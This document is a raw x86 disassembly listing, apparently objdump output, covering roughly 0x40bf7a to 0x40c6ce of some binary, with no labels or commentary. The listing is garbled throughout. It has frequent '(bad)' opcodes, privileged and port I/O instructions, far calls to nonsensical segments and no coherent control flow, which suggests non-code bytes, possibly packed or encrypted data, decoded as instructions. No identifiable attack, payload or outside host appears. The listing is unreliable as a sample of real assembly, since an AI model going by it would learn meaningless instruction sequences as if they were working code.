  40bf7a:	fimul  WORD PTR [ebx+0x223effcc]
  40bf80:	into   
  40bf81:	in     al,dx
  40bf82:	shr    esp,cl
  40bf84:	mov    ecx,0x128a2031
  40bf89:	sbb    eax,0x33579758
  40bf8e:	ja     0x40bfb8
  40bf90:	mov    BYTE PTR [eax-0x7af384c6],dl
  40bf96:	iret   
  40bf97:	and    ebx,DWORD PTR [ebx-0x57474538]
  40bf9d:	xor    al,0x62
  40bf9f:	lds    edx,FWORD PTR [ebx-0x1ff65dab]
  40bfa5:	loope  0x40bf39
  40bfa7:	dec    ecx
  40bfa8:	das    
  40bfa9:	(bad)  [ecx-0x6d]
  40bfac:	mov    ds:0x7fde489a,eax
  40bfb1:	inc    edi
  40bfb2:	sub    esi,edi
  40bfb4:	ret    
  40bfb5:	mov    al,0x4e
  40bfb7:	xor    esp,0xc9507daf
  40bfbd:	or     BYTE PTR [eax-0x3f],ch
  40bfc0:	lods   al,BYTE PTR ds:[esi]
  40bfc1:	fild   QWORD PTR [ebx+0x1b]
  40bfc4:	in     al,0xe9
  40bfc6:	jmp    DWORD PTR [ecx+0x253f2d8]
  40bfcc:	sbb    BYTE PTR [edx+0x17],0x9e
  40bfd0:	mov    al,0xa7
  40bfd2:	icebp  
  40bfd3:	(bad)  
  40bfd4:	cli    
  40bfd5:	adc    ecx,DWORD PTR [edx]
  40bfd7:	adc    BYTE PTR [ebp-0x775226f0],dl
  40bfdd:	xlat   BYTE PTR ds:[ebx]
  40bfde:	mov    cl,0xca
  40bfe0:	sub    esp,DWORD PTR [ecx]
  40bfe2:	dec    edi
  40bfe3:	cmp    DWORD PTR [esi+0x1d],ebp
  40bfe6:	cmp    DWORD PTR [ebp+0x45e78c50],esp
  40bfec:	ss inc edx
  40bfee:	or     bl,BYTE PTR [ecx]
  40bff0:	push   esp
  40bff1:	and    BYTE PTR [edx],0x6a
  40bff4:	fdiv   QWORD PTR [edi]
  40bff6:	sahf   
  40bff7:	push   edi
  40bff8:	call   0xa7eea8c8
  40bffd:	retf   
  40bffe:	cmc    
  40bfff:	pop    edx
  40c000:	pop    ecx
  40c001:	dec    eax
  40c002:	xlat   BYTE PTR ds:[ebx]
  40c003:	sbb    dl,BYTE PTR [esi]
  40c005:	repz inc ebx
  40c007:	fisubr WORD PTR [ebp-0x23]
  40c00a:	(bad)  
  40c00b:	cmp    bh,BYTE PTR [eax-0x4f8b1af2]
  40c011:	inc    esi
  40c012:	xchg   esi,eax
  40c013:	shr    ebx,0xe1
  40c016:	nop
  40c017:	in     eax,0xfb
  40c019:	les    esp,FWORD PTR [ebp+0x7]
  40c01c:	std    
  40c01d:	shl    BYTE PTR [edx],0x5f
  40c020:	push   0xe169ac0b
  40c025:	aad    0xc
  40c027:	sub    edi,ebx
  40c029:	dec    eax
  40c02a:	fwait
  40c02b:	cli    
  40c02c:	and    al,0xe4
  40c02e:	mov    bl,bh
  40c030:	xchg   edx,eax
  40c031:	mov    BYTE PTR [edi-0x4e76288e],ch
  40c037:	xor    al,0x4b
  40c039:	or     BYTE PTR [ecx+0x560293b5],dh
  40c03f:	or     edx,DWORD PTR [ebx]
  40c041:	stc    
  40c042:	mov    bl,0xff
  40c044:	pop    ss
  40c045:	lea    edi,[ecx+0x34]
  40c048:	jg     0x40c093
  40c04a:	aas    
  40c04b:	cmp    eax,0x88a21a0b
  40c050:	rol    BYTE PTR [ebp-0x35],cl
  40c053:	idiv   BYTE PTR [edi-0x80bd1ca]
  40c059:	cli    
  40c05a:	mov    ecx,0x1b7c248
  40c05f:	repnz and bh,BYTE PTR [eax]
  40c062:	mov    cl,0x93
  40c064:	jecxz  0x40c0d5
  40c066:	pop    ebx
  40c067:	out    dx,al
  40c068:	in     al,dx
  40c069:	mov    BYTE PTR [edx],bh
  40c06b:	xchg   esp,eax
  40c06c:	out    dx,al
  40c06d:	sbb    ecx,DWORD PTR [ebx+0xb]
  40c070:	push   0x1e5ca6da
  40c075:	cmp    ebp,eax
  40c077:	push   eax
  40c078:	inc    esp
  40c079:	(bad)  
  40c07a:	mov    al,ds:0x3d4af257
  40c07f:	cmp    al,0x7c
  40c081:	not    DWORD PTR [edi+eax*8+0x7]
  40c085:	imul   esi,DWORD PTR [ebx+ebx*1-0x70],0xffffff8d
  40c08a:	pop    esi
  40c08b:	inc    edx
  40c08c:	inc    eax
  40c08d:	stos   BYTE PTR es:[edi],al
  40c08e:	cmp    ebx,edi
  40c090:	lods   al,BYTE PTR ds:[esi]
  40c091:	lods   al,BYTE PTR ds:[esi]
  40c092:	fwait
  40c093:	and    eax,0x35bbfc32
  40c098:	sub    esi,DWORD PTR [ebp-0x49fbf986]
  40c09e:	pop    ebx
  40c09f:	pop    edi
  40c0a0:	test   BYTE PTR gs:[ebp+eax*2+0x19],ch
  40c0a5:	push   ecx
  40c0a6:	pop    ss
  40c0a7:	out    0x31,al
  40c0a9:	shr    DWORD PTR [esi+eax*4+0x1c],0x54
  40c0ae:	inc    ebp
  40c0af:	aas    
  40c0b0:	loopne 0x40c0bd
  40c0b2:	push   edx
  40c0b3:	fmul   QWORD PTR [edx]
  40c0b5:	test   eax,0xc3110712
  40c0ba:	pop    edi
  40c0bb:	cmp    DWORD PTR [ecx+0x31],esp
  40c0be:	xchg   edi,eax
  40c0bf:	push   0x68
  40c0c1:	add    BYTE PTR [ecx],dh
  40c0c3:	call   0x1285:0xde55d67d
  40c0ca:	push   ecx
  40c0cb:	and    al,0x23
  40c0cd:	popa   
  40c0ce:	out    0x72,eax
  40c0d0:	pop    esi
  40c0d1:	mov    eax,edx
  40c0d3:	or     al,0xe3
  40c0d5:	shr    BYTE PTR [ecx+0x3661dda5],cl
  40c0db:	pushf  
  40c0dc:	xchg   edi,eax
  40c0dd:	xchg   edx,eax
  40c0de:	dec    ebx
  40c0df:	jns    0x40c134
  40c0e1:	jmp    0xb4e2:0xf9ab13a6
  40c0e8:	push   cs
  40c0e9:	sar    DWORD PTR [esi+0x54],cl
  40c0ec:	adc    DWORD PTR [eax],0xffffffcd
  40c0ef:	icebp  
  40c0f0:	rol    BYTE PTR [esi+0x4c],cl
  40c0f3:	daa    
  40c0f4:	lods   eax,DWORD PTR ds:[esi]
  40c0f5:	or     eax,0x5e14f1b
  40c0fa:	test   eax,0x5fb7dcca
  40c0ff:	add    eax,0x6fd390d1
  40c104:	xor    DWORD PTR [eax-0x32],0x43c80036
  40c10b:	pusha  
  40c10c:	fdiv   st(2),st
  40c10e:	jbe    0x40c0fc
  40c110:	add    DWORD PTR [esi],ecx
  40c112:	mov    bh,bl
  40c114:	xchg   esi,eax
  40c115:	lods   eax,DWORD PTR ds:[esi]
  40c116:	inc    esi
  40c117:	fsubr  QWORD PTR [ebx+0x573a0aca]
  40c11d:	outs   dx,DWORD PTR ds:[esi]
  40c11e:	jb     0x40c12c
  40c120:	pusha  
  40c121:	pop    ds
  40c122:	repz rol BYTE PTR [eax+0x62],0x4
  40c127:	test   al,0xac
  40c129:	inc    esp
  40c12a:	je     0x40c197
  40c12c:	jmp    0x40c0dc
  40c12e:	mov    ebx,0xdeebc93
  40c133:	ret    0xd4a9
  40c136:	mov    al,0xef
  40c138:	rol    BYTE PTR [eax],0x7e
  40c13b:	xchg   ebp,eax
  40c13c:	cli    
  40c13d:	and    ebx,DWORD PTR [ebx-0x65]
  40c140:	loopne 0x40c13f
  40c142:	dec    DWORD PTR [ebp+0x5]
  40c145:	aam    0x2
  40c147:	inc    ebx
  40c148:	das    
  40c149:	(bad)
  40c14c:	mov    DWORD PTR [edi+0x3a],esp
  40c14f:	mov    edi,es
  40c151:	mov    bl,0x14
  40c153:	push   0x5c
  40c155:	jbe    0x40c151
  40c157:	enter  0x4c98,0x4
  40c15b:	cmp    ecx,DWORD PTR [edx-0x6911d62]
  40c161:	lods   eax,DWORD PTR ds:[esi]
  40c162:	(bad)  
  40c163:	out    0x79,eax
  40c165:	ins    DWORD PTR es:[edi],dx
  40c166:	mov    ecx,0x5576e22f
  40c16b:	mov    bh,0x33
  40c16d:	sub    eax,0x93d57199
  40c172:	mov    esi,0x508e9fbb
  40c177:	jbe    0x40c1e9
  40c179:	add    esp,DWORD PTR gs:[edi]
  40c17c:	or     al,0x22
  40c17e:	ret    0x2462
  40c181:	retf   0x776d
  40c184:	cmp    BYTE PTR [ecx-0x11],ah
  40c187:	fsubr  DWORD PTR [edi+0x58]
  40c18a:	mov    edx,0xc2bd7d10
  40c18f:	jno    0x40c185
  40c191:	ret    
  40c192:	shld   DWORD PTR [ebp+0x55],edi,cl
  40c196:	sbb    BYTE PTR ss:[ecx],0x95
  40c19a:	sub    DWORD PTR [eax],ebp
  40c19c:	ror    DWORD PTR [edi-0x52],1
  40c19f:	jns    0x40c12c
  40c1a1:	nop
  40c1a2:	sbb    eax,0x860840aa
  40c1a7:	ret    0xea58
  40c1aa:	cmp    ecx,DWORD PTR [ecx]
  40c1ac:	clc    
  40c1ad:	sub    ecx,DWORD PTR [eax+0x41]
  40c1b0:	int3   
  40c1b1:	mov    ecx,0x95e6c9a0
  40c1b6:	out    0x6d,eax
  40c1b8:	xlat   BYTE PTR ds:[ebx]
  40c1b9:	out    0x53,eax
  40c1bb:	fidiv  DWORD PTR [eax]
  40c1bd:	pop    edi
  40c1be:	div    DWORD PTR [ebx+0x11aea8ae]
  40c1c4:	je     0x40c22b
  40c1c6:	jmp    0xbc06:0xe038df7b
  40c1cd:	cmc    
  40c1ce:	sbb    ebp,DWORD PTR [edx+0x53]
  40c1d1:	test   ch,dl
  40c1d3:	daa    
  40c1d4:	and    eax,0xf2afe9bc
  40c1d9:	clc    
  40c1da:	call   0x48d:0x748db553
  40c1e1:	jecxz  0x40c169
  40c1e3:	rol    BYTE PTR [eax],0x11
  40c1e6:	sbb    DWORD PTR [ebp-0xa],edx
  40c1e9:	mov    ebx,0x10ef1781
  40c1ee:	or     al,0x6c
  40c1f0:	js     0x40c240
  40c1f2:	shr    DWORD PTR [esp+eax*1-0x3d480c92],0x92
  40c1fa:	xlat   BYTE PTR ds:[ebx]
  40c1fb:	mov    cl,0xc4
  40c1fd:	out    dx,eax
  40c1fe:	test   DWORD PTR ds:0xf0a71138,ebx
  40c204:	hlt    
  40c205:	inc    ecx
  40c206:	inc    esp
  40c207:	inc    ecx
  40c208:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c209:	repnz push cs
  40c20b:	mov    ebp,DWORD PTR ds:0xdbb2ea21
  40c211:	xlat   BYTE PTR ds:[ebx]
  40c212:	jns    0x40c1a5
  40c214:	xchg   edi,edx
  40c216:	ja     0x40c25e
  40c218:	das    
  40c219:	ret    0xdc26
  40c21c:	mov    BYTE PTR [edx-0x56ee861f],cl
  40c222:	cld    
  40c223:	call   FWORD PTR [edi]
  40c225:	stos   DWORD PTR es:[edi],eax
  40c226:	dec    ecx
  40c227:	popa   
  40c228:	dec    ecx
  40c229:	cmp    BYTE PTR [esp+esi*1],0x9
  40c22d:	in     eax,0x7b
  40c22f:	xchg   esp,eax
  40c230:	test   al,0xe6
  40c232:	clc    
  40c233:	jb     0x40c233
  40c235:	enter  0x6403,0x42
  40c239:	mov    al,BYTE PTR [edx+0x4f]
  40c23c:	dec    eax
  40c23d:	xchg   ebx,eax
  40c23e:	ret    
  40c23f:	pop    ds
  40c240:	inc    esi
  40c241:	cmp    BYTE PTR [esi+0xaefeb1a],dl
  40c247:	sbb    bl,BYTE PTR [eax-0x629ccf5b]
  40c24d:	sbb    eax,0x1a86d347
  40c252:	popa   
  40c253:	int    0x5a
  40c255:	push   eax
  40c256:	cmp    esi,DWORD PTR [ebp+edi*8+0x696ac4dd]
  40c25d:	pop    ss
  40c25e:	or     BYTE PTR fs:0x4d5a2e68,ch
  40c265:	jle    0x40c24e
  40c267:	out    dx,al
  40c268:	and    eax,0xdeb6d23a
  40c26d:	ds pop esp
  40c26f:	add    ah,BYTE PTR [ecx]
  40c271:	mov    ah,0x3c
  40c273:	cmp    ebp,DWORD PTR [esi+eiz*8-0xc]
  40c277:	or     ah,BYTE PTR [edi+ebx*4-0x5a3904f1]
  40c27e:	jge    0x40c20a
  40c280:	sahf   
  40c281:	(bad)  
  40c282:	(bad)  
  40c283:	mul    BYTE PTR [ebp+ebp*8+0x1d]
  40c287:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c288:	dec    ebp
  40c289:	loop   0x40c296
  40c28b:	sbb    BYTE PTR [eax-0x469b5f20],bh
  40c291:	pusha  
  40c292:	je     0x40c288
  40c294:	sbb    BYTE PTR ds:0x3b2b86b4,0xef
  40c29b:	push   edx
  40c29c:	(bad)  
  40c29d:	lahf   
  40c29e:	inc    ebp
  40c29f:	pop    ss
  40c2a0:	cmp    al,0x68
  40c2a2:	inc    edi
  40c2a3:	test   al,0x74
  40c2a5:	stos   DWORD PTR es:[edi],eax
  40c2a6:	lahf   
  40c2a7:	inc    eax
  40c2a8:	ins    BYTE PTR es:[edi],dx
  40c2a9:	scas   al,BYTE PTR es:[edi]
  40c2aa:	sbb    cl,BYTE PTR [edx+0x7de0cbe9]
  40c2b0:	mov    edx,0xe42be550
  40c2b5:	int    0x6b
  40c2b7:	xlat   BYTE PTR ds:[ebx]
  40c2b8:	frstor [ecx]
  40c2ba:	ja     0x40c2af
  40c2bc:	mov    ecx,0x5fb15be1
  40c2c1:	add    ah,BYTE PTR [edx+0x77]
  40c2c4:	xchg   ecx,eax
  40c2c5:	rcl    BYTE PTR [edx],0xbc
  40c2c8:	pop    esi
  40c2c9:	pop    esp
  40c2ca:	lock out 0xaa,al
  40c2cd:	cmp    al,0x9b
  40c2cf:	adc    esi,DWORD PTR [ebx]
  40c2d1:	push   edi
  40c2d2:	stc    
  40c2d3:	stos   BYTE PTR es:[edi],al
  40c2d4:	xchg   DWORD PTR [edx-0x6e5033a1],ebp
  40c2da:	bound  ebp,QWORD PTR [ebx+0x3b]
  40c2dd:	add    ch,BYTE PTR fs:[ebx-0x5af8dd38]
  40c2e4:	fstp   TBYTE PTR [ecx+edi*1]
  40c2e7:	add    al,0x97
  40c2e9:	jg     0x40c2be
  40c2eb:	pop    esp
  40c2ec:	arpl   WORD PTR [ecx],cx
  40c2ee:	jbe    0x40c343
  40c2f0:	(bad)  
  40c2f1:	sti    
  40c2f2:	cmp    bh,BYTE PTR [edi-0x423e22c2]
  40c2f8:	je     0x40c306
  40c2fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c2fb:	xor    BYTE PTR [ebx],ah
  40c2fd:	or     eax,0xc82512cc
  40c302:	push   0x36
  40c304:	cdq    
  40c305:	mov    ebx,0x7196ac91
  40c30a:	cmp    BYTE PTR [edi],al
  40c30c:	inc    ebp
  40c30d:	pop    edx
  40c30e:	pop    ds
  40c30f:	push   ss
  40c310:	xchg   edi,eax
  40c311:	in     al,dx
  40c312:	int3   
  40c313:	es mov ebp,0x1886c044
  40c319:	add    al,0x6b
  40c31b:	mov    esi,0x881aa4a6
  40c320:	clc    
  40c321:	mov    dl,0x11
  40c323:	lods   eax,DWORD PTR ds:[esi]
  40c324:	mov    ds:0xd1f9bddc,al
  40c329:	cmc    
  40c32a:	outs   dx,BYTE PTR ds:[esi]
  40c32b:	fwait
  40c32c:	push   ecx
  40c32d:	pop    ss
  40c32e:	cmp    dl,BYTE PTR [esi-0x1a232a7b]
  40c334:	mov    WORD PTR [ecx+0xd],fs
  40c337:	fstp   TBYTE PTR [esi]
  40c339:	sub    bh,BYTE PTR [eax+edi*1+0x8109a1f]
  40c340:	and    ecx,DWORD PTR [edx]
  40c342:	cmp    BYTE PTR [edx],ah
  40c344:	push   ss
  40c345:	ud1    ebx,ebx
  40c348:	jb     0x40c300
  40c34a:	ss adc al,0x7
  40c34d:	inc    edx
  40c34e:	enter  0x4312,0x89
  40c352:	sbb    ch,BYTE PTR [ebx-0x1e25698f]
  40c358:	loop   0x40c2e2
  40c35a:	mov    bh,0x6e
  40c35c:	test   DWORD PTR [edi-0x32afa3d2],ecx
  40c362:	push   0xfffffff4
  40c364:	in     al,dx
  40c365:	imul   ebp,DWORD PTR [ebx-0x3ea9df41],0x3af2f5fb
  40c36f:	mov    ds:0xa230997e,eax
  40c374:	push   ss
  40c375:	push   ecx
  40c376:	std    
  40c377:	inc    edi
  40c378:	push   ss
  40c379:	or     al,0x9
  40c37b:	mov    al,0xcb
  40c37d:	xchg   ebx,eax
  40c37e:	inc    ebp
  40c37f:	fwait
  40c380:	mov    al,0x7d
  40c382:	into   
  40c383:	aas    
  40c384:	and    bl,ah
  40c386:	(bad)  
  40c388:	(bad)  
  40c389:	into   
  40c38a:	test   DWORD PTR [eax+0x45d801a2],edx
  40c390:	fidivr WORD PTR [edi]
  40c392:	jae    0x40c3e4
  40c394:	mov    dl,0x71
  40c396:	mov    BYTE PTR [edx-0x1d4c4a],bh
  40c39c:	inc    ecx
  40c39d:	ror    DWORD PTR ds:0x15ecab4a,cl
  40c3a3:	fcmovnu st,st(1)
  40c3a5:	shl    DWORD PTR [edx],1
  40c3a7:	test   al,0xea
  40c3a9:	xchg   DWORD PTR ds:[esi+0x61],esp
  40c3ad:	jmp    0xa31:0x1473636a
  40c3b4:	fcmovu st,st(2)
  40c3b6:	pop    es
  40c3b7:	out    0xcb,eax
  40c3b9:	rcr    BYTE PTR [ebx],cl
  40c3bb:	sub    ecx,DWORD PTR [esi]
  40c3bd:	ins    DWORD PTR es:[edi],dx
  40c3be:	arpl   WORD PTR [ebp+0xe],si
  40c3c1:	inc    ebp
  40c3c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c3c3:	int    0x9
  40c3c5:	mov    ebp,0x1bb696b
  40c3ca:	out    dx,eax
  40c3cb:	and    ebx,esi
  40c3cd:	push   0x194a4c6b
  40c3d2:	imul   esi,DWORD PTR [esp+eiz*2-0xffa1f59],0x16
  40c3da:	daa    
  40c3db:	aam    0x57
  40c3dd:	hlt    
  40c3de:	xchg   ebx,eax
  40c3df:	sbb    DWORD PTR [eax-0x72310f95],ebp
  40c3e5:	fld    TBYTE PTR [edx]
  40c3e7:	fs cld 
  40c3e9:	dec    esi
  40c3ea:	push   es
  40c3eb:	outs   dx,BYTE PTR ds:[esi]
  40c3ec:	icebp  
  40c3ed:	adc    eax,0x5d97948b
  40c3f2:	cmp    DWORD PTR [esi],esi
  40c3f4:	xchg   esi,eax
  40c3f5:	ret    0x6a71
  40c3f8:	xor    esp,ebx
  40c3fa:	mov    dl,BYTE PTR ds:0x382f4423
  40c400:	jmp    0x1e095c9c
  40c405:	in     eax,dx
  40c406:	adc    BYTE PTR [esi+0x13],0xef
  40c40a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c40b:	hlt    
  40c40c:	pop    esp
  40c40d:	sbb    eax,0x2c8941e3
  40c412:	loope  0x40c491
  40c414:	jns    0x40c3d4
  40c416:	mov    esp,0x98742561
  40c41b:	dec    ecx
  40c41c:	stc    
  40c41d:	mov    esi,0x3b46c0b9
  40c422:	idiv   ch
  40c424:	pusha  
  40c425:	popa   
  40c426:	or     bh,ah
  40c428:	ins    BYTE PTR es:[edi],dx
  40c429:	outs   dx,BYTE PTR ds:[esi]
  40c42a:	mov    esi,0xd86f0f4f
  40c42f:	pop    ss
  40c430:	jmp    0xea86423d
  40c435:	lds    edi,FWORD PTR [edi-0x68]
  40c438:	sbb    esi,edx
  40c43a:	test   al,0x8d
  40c43c:	sbb    eax,DWORD PTR [edx-0x14225c59]
  40c442:	outs   dx,BYTE PTR ds:[esi]
  40c443:	xor    DWORD PTR [eax],eax
  40c445:	dec    esp
  40c446:	je     0x40c429
  40c448:	ins    BYTE PTR es:[edi],dx
  40c449:	xor    eax,esp
  40c44b:	mov    ebp,0x9690fa70
  40c450:	push   ss
  40c451:	or     eax,0x9388a911
  40c456:	leave  
  40c457:	ficomp WORD PTR [eax+0x6b9f22ec]
  40c45d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c45e:	jbe    0x40c472
  40c460:	mov    bl,0xa2
  40c462:	cmp    ebx,0x69
  40c465:	add    dl,0x5a
  40c468:	nop
  40c469:	xchg   edx,eax
  40c46a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c46b:	(bad)  
  40c46c:	into   
  40c46d:	jmp    0xaacd:0x6df6d87c
  40c474:	add    bh,BYTE PTR [edi-0x26dc14e9]
  40c47a:	and    edi,edi
  40c47c:	ret    
  40c47d:	adc    BYTE PTR [ecx+0x3b],cl
  40c480:	push   0x822c7e98
  40c485:	jno    0x40c4d3
  40c487:	leave  
  40c488:	add    al,0xbe
  40c48a:	add    eax,ebx
  40c48c:	pop    edx
  40c48d:	icebp  
  40c48e:	or     esp,DWORD PTR [ecx-0x6b6fde1e]
  40c494:	mov    cl,0xc8
  40c496:	call   0x6da5:0x6db35127
  40c49d:	call   0xbedc9f0e
  40c4a2:	mov    esp,0xe2990d37
  40c4a7:	cmp    al,0xa8
  40c4a9:	sbb    eax,0x3f76d263
  40c4ae:	jecxz  0x40c4c6
  40c4b0:	sub    al,0x4e
  40c4b2:	mov    ecx,0x75abeb92
  40c4b7:	pop    edi
  40c4b8:	fcompp 
  40c4ba:	unpckhps xmm1,XMMWORD PTR [bp-0x3304]
  40c4c0:	dec    esi
  40c4c1:	add    edx,DWORD PTR [ebx+eiz*4+0x3f8547b5]
  40c4c8:	sub    edi,esp
  40c4ca:	lea    eax,[edi-0x2a]
  40c4cd:	pop    edx
  40c4ce:	out    0x9c,al
  40c4d0:	jmp    0x47baf300
  40c4d5:	(bad)  
  40c4d6:	and    ecx,ecx
  40c4d8:	lahf   
  40c4d9:	add    BYTE PTR [edx-0x3d],dh
  40c4dc:	mov    ds:0x8c93f3b3,al
  40c4e1:	scas   eax,DWORD PTR es:[edi]
  40c4e2:	pop    ebx
  40c4e3:	loopne 0x40c474
  40c4e5:	mov    ebx,0xaf25b247
  40c4ea:	xchg   ebp,eax
  40c4eb:	xlat   BYTE PTR ds:[ebx]
  40c4ec:	sbb    DWORD PTR [esi-0x42],edx
  40c4ef:	jl     0x40c523
  40c4f1:	sub    al,0xb
  40c4f3:	lods   eax,DWORD PTR ds:[esi]
  40c4f4:	mov    al,0x4f
  40c4f6:	mov    dl,0xfd
  40c4f8:	fwait
  40c4f9:	mov    dl,0xf5
  40c4fb:	adc    ebx,eax
  40c4fd:	mov    fs,ebp
  40c4ff:	ins    DWORD PTR es:[edi],dx
  40c500:	push   ebx
  40c501:	sbb    DWORD PTR [ebx-0x616f8a8e],ebp
  40c507:	stos   BYTE PTR es:[edi],al
  40c508:	jno    0x40c546
  40c50a:	movlps QWORD PTR [eax-0x32e392be],xmm4
  40c511:	test   ah,dh
  40c513:	add    ch,cl
  40c515:	pushf  
  40c516:	mov    dh,0x84
  40c518:	cld    
  40c519:	inc    esp
  40c51a:	mov    ah,0xc5
  40c51c:	sahf   
  40c51d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c51e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c51f:	xor    ebp,DWORD PTR [ebx-0x51]
  40c522:	test   DWORD PTR ds:0xb5f48dc9,edi
  40c528:	mov    ch,0xc3
  40c52a:	int3   
  40c52b:	(bad)  
  40c52d:	mov    dh,0x1
  40c52f:	sub    BYTE PTR gs:[esi+0x68],ch
  40c533:	imul   ecx,DWORD PTR [esp+esi*2-0x6],0xffffff90
  40c538:	lock ds sbb eax,edx
  40c53c:	fld    DWORD PTR [ecx+0x61]
  40c53f:	arpl   WORD PTR [edx-0x38],si
  40c542:	mov    ch,0x8e
  40c544:	pop    edi
  40c545:	cmp    DWORD PTR [ebp-0x63],edx
  40c548:	loopne 0x40c59e
  40c54a:	adc    dh,BYTE PTR [edx]
  40c54c:	into   
  40c54d:	imul   edx,DWORD PTR [ebp+0x62],0x7802ca44
  40c554:	clc    
  40c555:	and    al,0x69
  40c557:	fs pop edx
  40c559:	or     bl,ch
  40c55b:	sbb    eax,0x709a6622
  40c560:	push   ss
  40c561:	push   edx
  40c562:	push   esi
  40c563:	mov    dl,BYTE PTR [edx-0x3f3c6f63]
  40c569:	call   0xafeb:0xea19ad87
  40c570:	mov    esi,0x65ca91ad
  40c575:	xchg   esp,eax
  40c576:	fwait
  40c577:	mov    al,ds:0x6703a66b
  40c57c:	jmp    0x5b12:0x7ee052d4
  40c583:	push   ebp
  40c584:	nop
  40c585:	aas    
  40c586:	fwait
  40c587:	cmp    ebp,DWORD PTR [edi-0x669c7a38]
  40c58d:	mov    ebp,0x257e86be
  40c592:	jbe    0x40c603
  40c594:	inc    ebp
  40c595:	ins    DWORD PTR es:[edi],dx
  40c596:	dec    ecx
  40c597:	ins    DWORD PTR es:[edi],dx
  40c598:	push   ebx
  40c599:	daa    
  40c59a:	sbb    edi,ecx
  40c59c:	fcom   DWORD PTR [ebx+0x56]
  40c59f:	(bad)  
  40c5a0:	cli    
  40c5a1:	push   esi
  40c5a2:	or     eax,0x12a69201
  40c5a7:	mov    fs,WORD PTR [ebx]
  40c5a9:	ret    0x2c60
  40c5ac:	iret   
  40c5ad:	cdq    
  40c5ae:	in     al,dx
  40c5af:	test   BYTE PTR [esi+0x46a4031d],dl
  40c5b5:	(bad)  [edx+0x5a6fb96c]
  40c5bb:	mov    ds:0x65b0fc13,eax
  40c5c0:	out    dx,al
  40c5c1:	cwde   
  40c5c2:	hlt    
  40c5c3:	dec    edx
  40c5c4:	loopne 0x40c585
  40c5c6:	mov    ?,WORD PTR [esi+0x18]
  40c5c9:	test   DWORD PTR [ecx],0xca0126c5
  40c5cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c5d0:	jbe    0x40c59f
  40c5d2:	mov    ah,0x9e
  40c5d4:	jb     0x40c5a1
  40c5d6:	stc    
  40c5d7:	aam    0x53
  40c5d9:	sbb    eax,0x82903e85
  40c5de:	imul   eax,ecx,0x1ff63220
  40c5e4:	aam    0x36
  40c5e6:	out    dx,eax
  40c5e7:	in     al,dx
  40c5e8:	retf   
  40c5e9:	in     eax,0x6d
  40c5eb:	adc    DWORD PTR [edx+0x37],esp
  40c5ee:	sbb    al,0xc0
  40c5f0:	pop    ss
  40c5f1:	imul   edi,DWORD PTR [ebx],0xae318065
  40c5f7:	fistp  DWORD PTR [eax-0x24e286d8]
  40c5fd:	out    dx,al
  40c5fe:	dec    esi
  40c5ff:	hlt    
  40c600:	mov    ch,0x34
  40c602:	clc    
  40c603:	iret   
  40c604:	mov    bh,0xf8
  40c606:	aaa    
  40c607:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c608:	jbe    0x40c58e
  40c60a:	inc    esp
  40c60b:	jl     0x40c5d5
  40c60d:	push   ebp
  40c60e:	or     ah,BYTE PTR [ebx-0x30b4b6ac]
  40c614:	xor    cl,bl
  40c616:	loopne 0x40c656
  40c618:	js     0x40c5fb
  40c61a:	inc    esp
  40c61b:	jbe    0x40c664
  40c61d:	xchg   edi,eax
  40c61e:	mov    WORD PTR [ecx+ebp*8],fs
  40c621:	loopne 0x40c5b2
  40c623:	sub    esi,DWORD PTR [eax+0x54]
  40c626:	add    cl,BYTE PTR [edi]
  40c628:	test   esp,ebx
  40c62a:	stos   BYTE PTR es:[edi],al
  40c62b:	inc    esi
  40c62c:	and    eax,0xd60b8ec6
  40c631:	push   0xffffff98
  40c633:	(bad)  
  40c634:	out    dx,eax
  40c635:	data16 arpl WORD PTR [edi-0x2a],bp
  40c639:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c63a:	test   BYTE PTR [edi],al
  40c63c:	jo     0x40c613
  40c63e:	pop    edx
  40c63f:	call   0xea6d:0x7c1029de
  40c646:	js     0x40c6bf
  40c648:	mov    dh,0xa5
  40c64a:	test   eax,0x9a00806e
  40c64f:	fisttp DWORD PTR [edi+0x6d3bfac5]
  40c655:	fnstsw WORD PTR [edx+0x1a432c63]
  40c65b:	or     DWORD PTR gs:[eax],esi
  40c65e:	stos   DWORD PTR es:[edi],eax
  40c65f:	enter  0x137a,0xb4
  40c663:	test   al,0x7d
  40c665:	mov    bl,0xad
  40c667:	(bad)  
  40c668:	xlat   BYTE PTR ds:[ebx]
  40c669:	push   0xf2bb8373
  40c66e:	sbb    eax,0xb8f6b319
  40c673:	(bad)  
  40c674:	or     eax,0x54fc7b0
  40c679:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c67a:	mov    ds:0xc5d9a10f,al
  40c67f:	fwait
  40c680:	xchg   esi,eax
  40c681:	xchg   BYTE PTR [edx-0x498538fc],al
  40c687:	scas   al,BYTE PTR es:[edi]
  40c688:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c689:	faddp  st(7),st
  40c68b:	jmp    0x40c697
  40c68d:	xor    eax,eax
  40c68f:	and    ch,bl
  40c691:	jge    0x40c63b
  40c693:	dec    ebx
  40c694:	ror    BYTE PTR [edi+esi*1-0x187056d4],1
  40c69b:	daa    
  40c69c:	or     eax,0xa58bfee5
  40c6a1:	std    
  40c6a2:	mov    ebp,0xbdc60071
  40c6a7:	xor    al,0xa9
  40c6a9:	fsubrp st(3),st
  40c6ab:	mov    esp,DWORD PTR fs:[edx-0xa]
  40c6af:	dec    eax
  40c6b0:	or     DWORD PTR [edx-0x59],edx
  40c6b3:	shr    DWORD PTR ds:0x9b7ba2c1,cl
  40c6b9:	mov    ds:0xad49325,al
  40c6be:	inc    esp
  40c6bf:	sub    bl,BYTE PTR [eax]
  40c6c1:	popf   
  40c6c2:	pop    edi
  40c6c3:	fs xor ecx,esp
  40c6c6:	icebp  
  40c6c7:	in     eax,dx
  40c6c8:	sub    DWORD PTR [edx],0x45550ad3
  40c6ce:	test   al,0xe9
